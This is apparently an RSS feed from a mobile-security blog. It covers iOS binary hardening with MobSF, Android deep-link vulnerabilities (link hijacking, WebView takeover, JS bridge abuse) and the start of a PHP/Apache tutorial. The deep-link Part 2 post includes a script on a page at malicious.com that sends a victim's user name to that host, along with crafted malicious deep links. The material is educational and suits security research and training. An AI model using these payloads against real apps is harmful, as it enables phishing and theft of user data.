class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.44.30.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="434" height="150"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
	-v print verbosely (symbolically) when possible</code></pre><p>If the stack canary is not present, you need to ensure that the <code>-fstack-protector-all</code> flag is set under <code>&quot;Other C Flags&quot;</code>, on your project&apos;s <code>&quot;Build Settings&quot;</code> tab, as shown below:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="881" height="165" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-22.50.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png 881w" sizes="(min-width: 720px) 720px"></figure><h2 id="rpath">Rpath</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="933" height="103" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png 933w"></figure><p>The &quot;Runpath Search Path&quot; instructs the dynamic linker to search for a dynamic library (dylib) on an ordered list of paths ... sort of like how Unix looks for binaries on <code>$PATH</code>.</p><p>This is an issue because it makes it possible for an attacker to place a malicious dylib in one of the first paths that doesn&apos;t contain the library that the linker is trying to locate, therefore hijacking it.</p><p>A simple way to check whether or not your application&apos;s libraries were compiled using <code>rpath</code> is to run <code>otool</code> with the <code>-L</code> flag, which lists all Mach-O Shared Libraries:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1324" height="245" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1324w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that some of the libraries are prefixed with <code>@rpath</code>, while others are prefixed by the absolute path.</p><p>Also, if you already have access to the full MobSF Static Analysis report, you can simply scroll down to the &quot;Libraries&quot; section and check which are prefixed by <code>@rpath</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="990" height="382" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.27.32.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png 990w"></figure><p>If your application uses the <a href="https://www.swift.org/package-manager/">Swift Package Manager</a>, in order to compile the libraries without <code>rpath</code> you need to use some hidden build flags. On your local command line run:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="943" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-19-at-19.33.44.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png 943w"></figure><p>Note the swift compiler option <code>no-stdlib-rpath</code> which disables <code>rpath</code> entries during compilation.</p><p>Configure your build settings so that the application is built with this configuration flag, e.g.: <code>swift build -c release -Xswiftc -no-toolchain-stdlib-rpath</code>.</p><p>Alternatively, if your application uses <a href="https://cocoapods.org/">Cocoapods</a>, you can first check the install directory of the pods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-13-at-13.15.10.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>And then use the following configuration on your <code>Podfile</code>:</p><pre><code class="language-ruby">post_install do |installer|
  installer.pods_project.targets.each do |target|
    target.build_configurations.each do |config|
      config.build_settings[&apos;DYLIB_INSTALL_NAME_BASE&apos;] = &lt;your-install-directory&gt;
    end
  end
end</code></pre><p>So, the result would looks something like this:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-13-at-13.16.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><h2 id="symbols-stripped">Symbols Stripped</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>From Apple&apos;s <a href="https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information">Building Your App to Include Debugging Information</a>:</p><blockquote>When Xcode compiles your source code into machine code, it generates a list of symbols in your app&#x2014;class names, global variables, and method and function names. <br>These symbols correspond to the file and line numbers where they&#x2019;re defined; this association creates a <em><em>debug symbol</em></em>, so you can use the debugger in Xcode, or refer to line numbers reported by a crash report. <br>Debug builds of an app place the debug symbols inside the compiled binary file by default, while <strong>release builds of an app place the debug symbols in a companion <em><em>Debug Symbol file</em></em> </strong>(<code>dSYM</code>) to reduce the size of the distributed app.</blockquote><p>So, the good thing about these <code>dSYM</code> files is that you can store them separately and then use them to <a href="https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report">symbolicate</a> your logs without actually letting the end user have access to them via App Store:</p><pre><code>~ symbolicatecrash &quot;&lt;path-to-crash-file&gt;&quot; &quot;&lt;path-to-dSYM file&gt;&quot; &gt; symbolicated.crash</code></pre><p>By default, <code>dSYM</code> files are generate for &quot;Release&quot; builds, which you can check by reviewing your <code>&quot;Build Settings&quot;</code>:</p><ul><li><code>Generate Debug Symbols</code> = <code>YES</code></li><li><code>Debug Information Format</code> = <code>DWARF with dSYM File</code></li></ul><p>A simple way to check whether or not your application was compiled with debug symbols is to again run <code>otool</code> with the <code>-Iv</code> flags:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.32.20.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Alternatively, you can use <code>nm</code>, which &quot;displays the name list (symbol table) of each &#xA0;object file in the argument list&quot;.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1101" height="474" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.43.08.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1101w"></figure><p>If MobSF flags you project as containing debug symbols, please ensure that your project&apos;s <code>&quot;Build Settings&quot;</code> contain the following <code>&quot;Release&quot;</code> configurations:</p><ul><li><code>Deployment Postprocessing</code> = <code>YES</code>;</li><li><code>Strip Debug Symbols During Copy</code> = <code>YES</code>;</li><li><code>Strip Linked Product</code> = <code>YES</code>;</li><li><code>Strip Style</code> = <code>All Symbols</code>;</li><li><code>Strip Swift Symbols</code> = <code>YES</code></li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/image-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="965" height="709" srcset="inesmartins.github.io/content/images/size/w600/2022/01/image-1.png 600w, inesmartins.github.io/content/images/2022/01/image-1.png 965w"></figure><p>Finally, note that you can actually manually strip your binary, but as shown below, this invalidates the code signature:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1410" height="49" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.46.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1410w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/">http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</a></li><li><a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf</a></li><li><a href="https://iphonedev.wiki/index.php/Crack_prevention">https://iphonedev.wiki/index.php/Crack_prevention</a></li><li><a href="https://blog.krzyzanowskim.com/2018/12/05/rpath-what/">https://blog.krzyzanowskim.com/2018/12/05/rpath-what/</a></li><li><a href="https://objective-see.com/blog/blog_0x46.html">https://objective-see.com/blog/blog_0x46.html</a></li><li><a href="https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk">https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 2]]></title><description><![CDATA[<p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-2/</link><guid isPermaLink="false">611910dbfd1c6c08ebabad54</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[text injection]]></category><category><![CDATA[open redirect]]></category><category><![CDATA[xss]]></category><category><![CDATA[LFI]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 15 Aug 2021 15:17:07 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 2"><p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android application, and they use deep links to improve the user experience of transitioning between the two.</p><h2 id="text-injection">Text Injection</h2><p>So, the first thing they want to do is allow the user to view messages in their application. In order to do that, they use the following deep link:</p><pre><code>abcbank://view-message?message=&lt;message&gt;</code></pre><p>The Android application takes the <code>message</code> parameter and injects it into a <a href="https://developer.android.com/reference/android/widget/TextView">TextView</a> element:</p><pre><code class="language-Java">String message = getIntent().getData().getQueryParameter(&apos;message&apos;)
TextView messageTextView = (TextView)findViewById(R.id.msgTextView);
messageTextView.setText(message);</code></pre><p>In this scenario, it&apos;s possible that a malicious user creates a deep link that tricks a victim into completing some sort of action, e.g.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1437" height="803" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.36.31.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1437w" sizes="(min-width: 720px) 720px"></figure><h2 id="webview-takeover">WebView Takeover</h2><p>Let&apos;s say a customer is not sure about how to complete a specific operation, so they call the bank&apos;s customer support line and the ABC Bank&apos;s employee decides to send a deep link to the customer, so they can open a specific website page inside their Android application:</p><pre><code>abcbank://help?page=https://abcbank.com/how-to-setup-mfa</code></pre><p>Inside the application there&apos;s a <a href="https://developer.android.com/guide/webapps/webview">WebView</a> and whatever URL is received via this <code>page</code> parameter is loaded without any additional validation, as so:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;page&apos;);</code></pre><p>In this scenario, a malicious attacker can craft a malicious deep link that replaces this <code>page</code> parameter with any other URL, e.g.:</p><pre><code>abcbank://help?page=https://malicious.com</code></pre><p>The result:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1438" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.46.07.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1438w" sizes="(min-width: 720px) 720px"></figure><p>Now, this is bad by itself, but there&apos;s yet another danger.</p><h3 id="access-to-web-bindings">Access to Web Bindings</h3><p>Let&apos;s say that the vulnerable WebView is used for multiple things inside the application, and one of those operations requires that the WebView has access to the username, that&apos;s stored inside the Android application.</p><p>In that case, the application can register a JS interface, e.g.:</p><pre><code class="language-Java">webview.addJavascriptInterface(WebAppInterface(this), &quot;Android&quot;)</code></pre><p>Then, inside the <code>WebAppInterface</code>, we can create a method such as:</p><pre><code class="language-Java">public final String getUserName() {
	return this.store.getUserName();
}</code></pre><p>Finally, the malicious attacker can create a malicious page that exfiltrates the user name of its visitors, as shown below:</p><pre><code>// https://malicious.com/index.html

&lt;DOCTYPE html&gt;
&lt;head&gt;
&lt;script&gt;
    var req = new XMLHttpRequest();
    xmlhttp.open(&quot;POST&quot;, https://malicious.com/user-data);
    xmlhttp.send(JSON.stringify(window.Android.getUserName()));
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
...</code></pre><p>The only thing left to do is to convince the victim to click the malicious deep link where this code is hosted:</p><pre><code>abcbank://help?page=https://malicious.com/index.html</code></pre><p>Note that in order for this to work there&apos;s an additional requirement, the WebView needs to have <a href="https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled(boolean)">JavaScript enabled</a>:</p><pre><code>webview.getSettings()setJavaScriptEnabled(true);</code></pre><h2 id="the-dangers-of-webviewloadurl">The dangers of WebView.loadUrl</h2><p>As we saw on the Open Redirect example shown above, we can use the <a href="https://developer.android.com/reference/android/webkit/WebView#loadUrl(java.lang.String)">loadUrl</a> method to load the given URL into a WebView:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;url&apos;);</code></pre><p>However, this method doesn&apos;t only support <code>http(s)</code> but also <code>javascript:</code>, <code>file://</code> and whatever else scheme you might want to try, you&apos;re only limited by the WebView configuration and the developer&apos;s validations.</p><h2 id="the-dangers-of-webviewloaddata">The dangers of WebView.loadData</h2><p>As the name suggests we can use <code>loadData</code> method to load data into a WebView using a <code>&apos;data&apos;</code> scheme URL. </p><p>This allows us to do some fun stuff like taking some <code>HTML</code> from a deep link parameter and injecting it directly into a WebView with JavaScript enabled, as shown in the example below:</p><pre><code>String html = getIntent().getData().getQueryParameter(&apos;html&apos;)

WebView wv = new WebView(this);
wb.getSettings().setJavaScriptEnabled(true);
wv.loadData(html, &quot;text/html&quot;, &quot;UTF-8&quot;)</code></pre><p>Now, we can go wherever imagination takes us, we&apos;re only restricted by the application&apos;s features and security restrictions.</p><hr><p><a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-3/index.html">Next</a>, we&apos;ll look into other fun vulnerabilities such as LFI and even RCE using deep links.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 1]]></title><description><![CDATA[<p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part1/</link><guid isPermaLink="false">610e4a2dfd1c6c08ebaba859</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[link hijacking]]></category><category><![CDATA[phishing]]></category><category><![CDATA[scheme urls]]></category><category><![CDATA[app links]]></category><category><![CDATA[intent urls]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 13 Aug 2021 18:22:56 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" alt="Exploiting Deep Links in Android - Part 1"><p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported deep link formats in Android, and then quickly jump into the first vulnerability: <strong>Link Hijacking</strong>.</p><hr><h2 id="an-intro-to-deep-links-in-android">An Intro to Deep Links in Android</h2><p>In short, deep links allow users to open specific content inside a mobile application.</p><p>In Android, there are 3 valid deep link formats:</p><ol><li><code>Scheme URLs</code> (aka <code>Custom Scheme URLs</code> or <code>URL Schemes</code>)</li><li><code>App Links</code> (aka <code>Android App Links</code>)</li><li><code>Intent URLs</code> (aka <code>Intent Scheme URLs</code>)</li></ol><p>Note that the first 2 have an iOS equivalent, while the 3rd only exists in Android.</p><h3 id="scheme-urls">Scheme URLs</h3><p>Scheme URLs were introduced with <code>Android 1.0</code> and <code>iOS 2.0</code> and clearly prioritised flexibility rather than security.</p><p>In this first iteration of deep links, <strong>any application can register any scheme, host and path</strong>, e.g.:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/GD5GzXCpD1TKrM1hnu1qcvNhs2_yIQn-2nrKrDrH4YRCIas12eCYr3N74GHPHNqtzJAmLOZnwCtB4kfcEEtmCfB9DHq_uNSd35zLO4wXkr6SG-_I_SYC7Ylczusju4M4MXfEbyUJruk" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>This means that there&apos;s no mechanism to ensure, for example, that all deep links with the <code>fb://</code> scheme are handled by the Facebook app.</p><p>If a user clicks on a deep link, the OS starts by checking which of the applications installed on the device have registered it:</p><ul><li>if there is <strong>only 1 application</strong>, the OS will automatically open the deep link with that application;</li><li>if there is more than 1 application, the OS will check if any of them <strong>have previously been set as the &quot;preference&quot;</strong> - if so, the OS will open the link with that application;</li><li>if there is more than 1 application and none of them have ever been set as the preference, the OS will prompt the user to choose between the apps.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.33.50.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="165"></figure><p>Note that if the user clicks &quot;Always&quot; on this prompt, the chosen application becomes the preference, and the prompt will not be shown again.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/image-2.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="508" height="444"></figure><p>Since any app can register any scheme, a victim application can become vulnerable to Link Hijacking, which we&apos;ll discussed in more detail at the end of this part.</p><h3 id="app-links">App Links</h3><p>App Links were introduced in 2015 with <code>Android 6</code> and <code>iOS 9</code> - note that in iOS they&apos;re called <a href="https://developer.apple.com/ios/universal-links/">Universal Links</a>.</p><p>App Links no longer support custom schemes, only <code>HTTP</code> or <code>HTTPS</code>. This makes the links &quot;natively&quot; compatible with any browser:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/R3QhI5qKJ94cfy_uvz28KSeLJkzk5jFpQzbDCdkCcgFCVajTgpl8i1RNepFyctgXH9HZlcKM8xkztDYrcS8Q5U_yNWdHgvRGSd9LiVrsFBphl9a0ilWTpqZhcbUDIAXHlZOhYMQPrYQ" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>More important, when it comes to security, App Links introduced a mechanism that (at least in theory) prevents other apps from claiming a link: <a href="https://developer.android.com/training/app-links/verify-site-associations">App Link Association</a>.</p><p><strong>App Link Association</strong></p><p>The idea is pretty simple: to make sure that all <code>https://foo.com</code> deep links are always handled by the <code>foo</code> application, the team at Foo simply needs to add a specific file on the <code>foo.com</code> server that contains the <code>SHA256</code> fingerprint of the <code>foo</code> app&apos;s signing certificate - see more details <a href="https://developer.android.com/training/app-links/verify-site-associations">here</a>.</p><p>When the <code>foo</code> application is being installed on the device, its <code>AndroidManifest.xml</code> file should indicate that it wants to register and verify the <code>https://foo.com</code> App Link, and as a result the OS will check the aforementioned file - if everything&apos;s OK, no other app will be able to claim this link.</p><figure class="kg-card kg-image-card"><img src="https://lh5.googleusercontent.com/7Pnd9LH0pel0rbFOvQqcQBuekklcA-YYIWEPOEpN_yZVDHB3sPgZVkgTV-rlIk2jHtS0jAz619EPBarBHsEh3LW83kBJ6zuOH9KPqbCbfCZOJ_e3JrngRznwwG_2WU9EzLi3IOUSwCw" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>So, the good people at Foo no longer need to worry about Link Hijacking right? ... Nope.</p><p>First, we should note that iOS and Android have different policies when it comes to handling failed verifications:</p><ul><li>iOS prohibits opening unverified Universal Links;</li><li>Android, however, leaves the decision up to users: if an unverified App Link is clicked, Android prompts users to choose if they want to open the link in the app or the browser.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.34.43.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>Worse even, according to <a href="https://people.cs.vt.edu/gangwang/deep17.pdf">a 2017 study</a>, most apps that use App Links are not correctly completing the verification process! <br>Some common errors included:</p><ul><li>Not creating the associate file</li><li>Registering the App Link with a protocol that doesn&apos;t match the file (<code>HTTP</code> vs <code>HTTPS</code>)</li><li>Having an invalid associate file</li><li>Having an invalid manifest file</li></ul><p>Finally, there is one type of Android app that is particularly vulnerable to link hijacking even when using App Links: <a href="https://developer.android.com/topic/google-play-instant">Instant Apps</a>.</p><p>This article won&apos;t go into detail regarding these vulnerabilities, but if you&apos;re interested I highly recommend <a href="http://www4.comp.polyu.edu.hk/~csxluo/AppLink.pdf">this paper</a>.</p><h3 id="intent-urls">Intent URLs</h3><p>Finally, let&apos;s look at the least used deep link type: Intent URLs. They were introduced in 2013 and have a completely different syntax:</p><p><code>intent://p/#Intent;scheme=foo;package=com.foo;end</code>. </p><p>As you can see, the package name of the target app is explicitly specified, which means the OS doesn&apos;t prompt the user for their decision, making them <strong>resistant to the types of link hijacking detailed below</strong>.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.35.13.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="110"></figure><hr><h2 id="link-hijacking">Link Hijacking</h2><p>As mentioned before, the fact that any application can register any Scheme URL, along with the improper implementation of App Links can make applications vulnerable to Link Hijacking, also known as &quot;Deep Link Collision&quot;.</p><p>But, why is this an issue?</p><h3 id="phishing">Phishing</h3><p>Imagine that a user installs a game application on their Android phone. Whenever the user opens the app they just see the game but, in fact, during installation this application registered a deep link that &quot;belongs&quot; to a banking app - <code>abcbank://</code> - which just so happens to be the user&apos;s bank.</p><p>One day this user happens to click on the same deep link registered by the &quot;malicious&quot; game app - this isn&apos;t strange since it&apos;s a valid deep link used by the actual ABC Bank.</p><p>Since the user doesn&apos;t yet have the <code>abcbank</code> application installed on their phone, the OS will automatically open the link with the game app. However, now instead of showing the regular game UI, this malicious app displays a login screen that looks exactly like the login screen for <code>abcbank</code>.</p><p>If the malicious application is able to trick the user into entering their <code>ABC Bank</code> credentials on this login screen, it&apos;s game over.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1436" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-21.27.40.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1436w" sizes="(min-width: 720px) 720px"></figure><h3 id="capturing-sensitive-data">Capturing Sensitive Data</h3><p>In 2019, it was <a href="https://hackerone.com/reports/855618">reported</a> that the Arrive app (now called <a href="https://play.google.com/store/apps/details?id=com.shopify.arrive&amp;hl=en_US&amp;gl=US">Shop</a>) was vulnerable to Account Takeover due to an unverified App Link:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="987" height="463" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-18.23.49.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png 987w"></figure><p>As shown in this example, whenever deep links are used to communicate sensitive data such as authentication tokens, an attacker can use link hijacking to intercept this data.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1437" height="806" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-22.35.39.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1437w" sizes="(min-width: 720px) 720px"></figure><h3 id="traffic-hijacking">Traffic Hijacking</h3><p>In their 2017 study, &quot;<a href="https://people.cs.vt.edu/gangwang/deep17.pdf">Measuring the Insecurity of Mobile Deep Links of Android</a>&quot;, Liu et al. reviewed 160,000+ applications (retrieved from the Play Store) and found many instances of applications that seemed to be registering custom schemes for popular applications in order to boost traffic to their own app. </p><p>They found, for example, that <code>google.com</code> is registered by 480 apps from 305 non-Google developers and that <code>google.navigation</code> from Google Maps was hijacked by 79 apps from 32 developers.</p><h3 id="competing-apps">Competing Apps</h3><p>In the same study mentioned above, it was found that a lot of applications register their competitors&apos; schemes in order to trick users into using their apps:</p><blockquote>For example, Careem (<code>com.careem.acma</code>) and QatarTaxi (<code>com.qatar.qatartaxi</code>) are two competing taxi booking apps in Dubai. Careem is more popular (5M+ downloads), which uses scheme <code>careem</code> for many functionalities such as booking a ride (from hotel websites) and adding credit card information. <br>QatarTaxi (10K downloads) registers to receive all <code>careem://*</code> deep links.<br>After code analysis, we find all these links redirect users to the QatarTaxi app&#x2019;s home screen, as an attempt to draw customers.</blockquote><hr><p>Hope you found this useful, on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">the next part</a> we&apos;ll try to see what happens when a user clicks on a malicious deep link.</p>]]></content:encoded></item><item><title><![CDATA[Running a PHP application on Big Sur using Apache]]></title><description><![CDATA[<p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd</code></pre>]]></description><link>inesmartins.github.io/running-php-app-on-big-sur-using-apache/</link><guid isPermaLink="false">60f93a52fd1c6c08ebab9dd6</guid><category><![CDATA[php]]></category><category><![CDATA[apache]]></category><category><![CDATA[big sur]]></category><category><![CDATA[macOS]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 23 Jul 2021 10:18:15 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" alt="Running a PHP application on Big Sur using Apache"><p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd -v 
Server version: Apache/2.4.46 (Unix)
